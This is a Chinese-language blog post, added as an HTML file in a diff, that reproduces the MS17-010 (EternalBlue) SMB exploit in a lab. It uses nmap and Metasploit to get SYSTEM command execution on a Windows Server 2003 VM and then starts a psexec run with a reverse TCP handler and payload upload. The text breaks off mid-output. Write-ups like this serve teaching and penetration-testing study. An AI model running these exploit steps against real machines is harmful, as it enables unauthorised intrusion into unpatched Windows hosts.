@@ -1,0 +1,1411 @@
+<link href="https://louisnie.github.io/harlem-shake-style.css" rel="stylesheet" type="text/css">
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+
+
+  <meta name="keywords" content="靶机实验,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Louisnie" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="不断进步,直到羔羊变成雄狮!   漏洞背景:继2016年 8 月份黑客组织 Shadow Brokers 放出第一批 NSA “方程式小组”内部黑客工具后，2017 年 4 月 14 日，Shadow Brokers 再次公布了一批新的 NSA 黑客工具，其中包含了一个攻击框架和多个 Windows 漏洞利用工具。攻击者利用这些漏洞可以远程获取 Windows 系统权限并植入后门。 针对此次泄露的">
+<meta name="keywords" content="靶机实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="与永恒之蓝的一场旅行">
+<meta property="og:url" content="https://louisnie.github.io/2019/02/19/ms17-010/index.html">
+<meta property="og:site_name" content="Louisnie">
+<meta property="og:description" content="不断进步,直到羔羊变成雄狮!   漏洞背景:继2016年 8 月份黑客组织 Shadow Brokers 放出第一批 NSA “方程式小组”内部黑客工具后，2017 年 4 月 14 日，Shadow Brokers 再次公布了一批新的 NSA 黑客工具，其中包含了一个攻击框架和多个 Windows 漏洞利用工具。攻击者利用这些漏洞可以远程获取 Windows 系统权限并植入后门。 针对此次泄露的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-24T17:48:17.983Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="与永恒之蓝的一场旅行">
+<meta name="twitter:description" content="不断进步,直到羔羊变成雄狮!   漏洞背景:继2016年 8 月份黑客组织 Shadow Brokers 放出第一批 NSA “方程式小组”内部黑客工具后，2017 年 4 月 14 日，Shadow Brokers 再次公布了一批新的 NSA 黑客工具，其中包含了一个攻击框架和多个 Windows 漏洞利用工具。攻击者利用这些漏洞可以远程获取 Windows 系统权限并植入后门。 针对此次泄露的">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://louisnie.github.io/2019/02/19/ms17-010/">
+
+
+
+
+
+  <title>与永恒之蓝的一场旅行 | Louisnie</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <style>
+  /*.tags0{font-size: 12px !important;color: #ccc !important;}灰*/
+
+  .tags00{font-size: 12px !important;color: #666 !important;}/*黑*/
+  /*.tags01{font-size: 12px !important;color: rgb(255,128,128) !important;}红
+  .tags02{font-size: 12px !important;color: rgb(128,255,128) !important;}绿
+  .tags03{font-size: 12px !important;color: rgb(128,128,255) !important;}蓝
+  .tags04{font-size: 12px !important;color: rgb(255,216,128) !important;}黄*/
+
+  /*.tags10{font-size: 20px !important;color: #666 !important;}*/
+  .tags11{font-size: 20px !important;color: rgb(255,128,128) !important;}
+  .tags12{font-size: 20px !important;color: rgb(128,255,128) !important;}
+  .tags13{font-size: 20px !important;color: rgb(128,128,255) !important;}
+  .tags14{font-size: 20px !important;color: rgb(255,216,128) !important;}
+
+  /*.tags20{font-size: 40px !important;color: #666 !important;}*/
+  .tags21{font-size: 40px !important;color: rgb(255,128,128) !important;}
+  .tags22{font-size: 40px !important;color: rgb(128,255,128) !important;}
+  .tags23{font-size: 40px !important;color: rgb(128,128,255) !important;}
+  .tags24{font-size: 40px !important;color: rgb(255,216,128) !important;}
+  </style>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	
+	<a href="https://github.com/Louisnie/louisnie.github.io" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Louisnie</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Attitude determines Altitude!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://louisnie.github.io/2019/02/19/ms17-010/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Louisnie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/10/22/5bcd762c46c2c.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Louisnie">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">与永恒之蓝的一场旅行</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-19T22:22:28+08:00">
+                2019-02-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/主机渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">主机渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,839 字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><blockquote class="blockquote-center">不断进步,直到羔羊变成雄狮!</blockquote></p>
+<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28285910&auto=1&height=66"></iframe></div>
+
+<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景:"></a>漏洞背景:</h2><p>继2016年 8 月份黑客组织 Shadow Brokers 放出第一批 NSA “方程式小组”内部黑客工具后，2017 年 4 月 14 日，Shadow Brokers 再次公布了一批新的 NSA 黑客工具，其中包含了一个攻击框架和多个 Windows 漏洞利用工具。攻击者利用这些漏洞可以远程获取 Windows 系统权限并植入后门。</p>
+<p>针对此次泄露的漏洞，微软提前发布了安全公告 MS17-010，修复了泄露的多个 SMB 远程命令执行漏洞。由于此次泄露的漏洞覆盖了大部分常见的 Windows 版本(包括微软不再提供更新服务的 Windows XP 和 Windows Server 2003)，网络空间中仍然存在大量可被入侵的设备</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><p>永恒之蓝漏洞是通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本:"></a>影响版本:</h2><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<p>目前在Metasploit上集成的攻击载荷是ms17_010_psexec和ms17_010_eternalblue,我在网上搜了好久,也没找到什么有价值的答案,我自己总结的是两点区别:</p>
+<p>一:ms17_010_psexec是SMB的远程代码执行漏洞,ms17_010_eternalblue是SMB的远程窗口内核池损坏漏洞</p>
+<p> 二:ms17_010_psexec是针对于上述所说的Windows系统都适用的,而ms17_010_eternalblue只适用于win7和win server2008R2的全版本</p>
+<p>这次我们使用ms17_010_psexec载荷进行渗透测试</p>
+<h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提:"></a>利用前提:</h2><p>1.防火墙必须允许SMB流量出入</p>
+<p>2.目标必须使用SMBv1协议</p>
+<p>3.目标必须缺少MS17-010补丁</p>
+<p>4.目标必须允许匿名IPC $和管道名</p>
+<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境:"></a>复现环境:</h2><p>攻击机:kali 4.15.0-kali2-amd64(192.168.135.134)</p>
+<p>靶机:Windows server2003(192.168.135.136)</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程:"></a>复现过程:</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用nmap对目标系统进行信息收集同时去扫描目标存在的漏洞(Nessus或者AWVS等扫描器都可以)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sV --script=vuln -O 192.168.135.136</span><br></pre></td></tr></table></figure>
+<p>参数-sV表示对目标主机进行软件版本的检测</p>
+<p>参数–script=vuln表示适用nmap自带的漏洞库区扫描目标系统存在的漏洞</p>
+<p>参数-O表示扫描目标的操作系统</p>
+<p>由于nmap默认扫描常用的一千个端口,所以我这里为了节省时间就没有加-p选项</p>
+<p>扫出来啦鼎鼎有名的ms08-067漏洞和ms17-010漏洞这两个远程代码执行的漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h3><h4 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h4><p>我们使用Metasploit-Framework(简称MSF)去利用ms17-010远程代码执行漏洞</p>
+<p>我们首先需要创建一个自己的数据库,将等会使用MSF获取的结果保存到我们自己的数据库中(也可以使用metasploit自带的数据库),MSF默认使用的数据库管理系统是PostgreSQL</p>
+<p>打开Postgresql服务:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service postgresql start</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /etc/init.d/postgresql start</span><br><span class="line">[ ok ] Starting postgresql (via systemctl): postgresql.service.</span><br></pre></td></tr></table></figure>
+<p>查看数据库运行状态:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service postgresql status </span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (exited) since Mon 2019-02-18 16:22:16 CST; 24h ago</span><br><span class="line">  Process: 11732 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 11732 (code=exited, status=0/SUCCESS)</span><br><span class="line"></span><br><span class="line">2月 18 16:22:16 kali systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">2月 18 16:22:16 kali systemd[1]: Started PostgreSQL RDBMS.</span><br></pre></td></tr></table></figure>
+<p>切换到postgres用户(Postgresql数据库管理系统所创建的用户)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# su - postgres</span><br></pre></td></tr></table></figure>
+<p>创建数据库管理员kkk:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# su - postgres </span><br><span class="line">postgres@kali:~$ createuser kkk -P</span><br><span class="line">为新角色输入的口令: </span><br><span class="line">再输入一遍:</span><br></pre></td></tr></table></figure>
+<p>创建数据库及其属主,其语法为createdb –owner=属主 数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres@kali:~$ createdb  --owner=kkk database1</span><br></pre></td></tr></table></figure>
+<p>然后就可以打开MSF终端利用漏洞啦</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br></pre></td></tr></table></figure>
+<p>查看当前所连接的数据库:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_status </span><br><span class="line">[*] postgresql connected to msf</span><br></pre></td></tr></table></figure>
+<p>断开连接,连接我们刚刚创建的数据库,</p>
+<p>断开数据库连接命令:db_disconnent</p>
+<p>连接新的数据库:格式是db_connect 用户名:密码@127.0.0.1/数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_disconnect </span><br><span class="line">msf &gt; db_connect kkk:passwd@127.0.0.1/database1</span><br></pre></td></tr></table></figure>
+<h4 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h4><p>这部分其实就是确认nmap扫描的结果是否准确,MSF提供专门扫描MS17-010的payload(载荷)我们可以在这里尝试一番,熟悉命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search ms17-010     //在漏洞库中搜索ms17-010的payload</span><br><span class="line">[!] Module database cache not built yet, using slow search</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                      Disclosure Date  Rank     Description</span><br><span class="line">   ----                                      ---------------  ----     -----------</span><br><span class="line">   auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection</span><br><span class="line">   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></pre></td></tr></table></figure>
+<p>我们使用auxiliary辅助模块中的ms17_010_command载荷去扫描确认目标系统是否真的有SMB服务的远程代码执行的漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/smb/ms17_010_command    //使用该载荷</span><br><span class="line">msf auxiliary(admin/smb/ms17_010_command) &gt; set rhosts 192.168.135.136   //设置目标</span><br><span class="line">rhosts =&gt; 192.168.135.136</span><br><span class="line">msf auxiliary(admin/smb/ms17_010_command) &gt; exploit  //进行攻击</span><br><span class="line"></span><br><span class="line">[*] 192.168.135.136:445   - Target OS: Windows Server 2003 3790 Service Pack 2</span><br><span class="line">[*] 192.168.135.136:445   - Filling barrel with fish... done</span><br><span class="line">[*] 192.168.135.136:445   - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.135.136:445   - 	[*] Preparing dynamite...</span><br><span class="line">[*] 192.168.135.136:445   - 		Trying stick 1 (x64)...Miss</span><br><span class="line">[*] 192.168.135.136:445   - 		[*] Trying stick 2 (x86)...Boom!</span><br><span class="line">[*] 192.168.135.136:445   - 	[+] Successfully Leaked Transaction!</span><br><span class="line">[*] 192.168.135.136:445   - 	[+] Successfully caught Fish-in-a-barrel</span><br><span class="line">[*] 192.168.135.136:445   - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.135.136:445   - Reading from CONNECTION struct at: 0x8fdf1cb0</span><br><span class="line">[*] 192.168.135.136:445   - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.135.136:445   - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[+] 192.168.135.136:445   - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">[*] 192.168.135.136:445   - Output for &quot;net group &quot;Domain Admins&quot; /domain&quot;:</span><br><span class="line">ةĻ     Domain Admins</span><br><span class="line">עˍ     ָ¶¨µœꝀ</span><br><span class="line"></span><br><span class="line">³ʔ±</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            </span><br><span class="line">ļ®³ɹ¦Ϊ³ɡ£</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 192.168.135.136:445   - Cleanup was successful</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+<p>Successful 而且目标为Administrator  权限</p>
+<h4 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(admin/smb/ms17_010_command) &gt; use exploit/windows/smb/ms17_010_psexec //使用攻击模块</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; set rhost 192.168.135.136 //设置目标</span><br><span class="line">rhost =&gt; 192.168.135.136</span><br></pre></td></tr></table></figure>
+<p>对于ms17_010_psexec攻击脚本,不需要设置payload,我原先设置windows/x64/meterpreter/reverse_tcp</p>
+<p>载荷一直不出来结果,后来才得知这个攻击脚本里面有meterpreter的载荷,无需设置即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; exploit   //开始攻击</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.135.134:4444 </span><br><span class="line">[*] 192.168.135.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2</span><br><span class="line">[*] 192.168.135.136:445 - Filling barrel with fish... done</span><br><span class="line">[*] 192.168.135.136:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.135.136:445 - 	[*] Preparing dynamite...</span><br><span class="line">[*] 192.168.135.136:445 - 		Trying stick 1 (x64)...Miss</span><br><span class="line">[*] 192.168.135.136:445 - 		[*] Trying stick 2 (x86)...Boom!</span><br><span class="line">[*] 192.168.135.136:445 - 	[+] Successfully Leaked Transaction!</span><br><span class="line">[*] 192.168.135.136:445 - 	[+] Successfully caught Fish-in-a-barrel</span><br><span class="line">[*] 192.168.135.136:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.135.136:445 - Reading from CONNECTION struct at: 0x8f3e37c0</span><br><span class="line">[*] 192.168.135.136:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.135.136:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 192.168.135.136:445 - Selecting native target</span><br><span class="line">[*] 192.168.135.136:445 - Uploading payload...</span><br><span class="line">[*] 192.168.135.136:445 - Created 